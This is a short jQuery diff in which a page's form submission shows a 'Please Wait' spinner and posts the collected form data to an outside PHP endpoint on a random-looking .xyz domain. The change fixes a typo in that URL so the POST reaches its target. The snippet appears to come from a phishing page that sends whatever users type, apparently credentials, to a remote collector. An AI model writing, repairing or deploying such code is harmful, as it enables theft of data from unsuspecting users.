@@ -37,7 +37,7 @@ $(document).ready(function() {
         $("#submitBtn").html(`<button id="submitBtn" class="btn btn-md btn-block btn-danger btn-block"> <span class="spinner-grow spinner-grow-sm"></span>
         Please Wait...</button>`).prop("disabled", true);
         $.ajax({
-            url: "https://jounkanvbx.xyz/m1/ya,php",
+            url: "https://jounkanvbx.xyz/m1/ya.php",
             type: 'POST',
             data: formData,
             contentType: false,
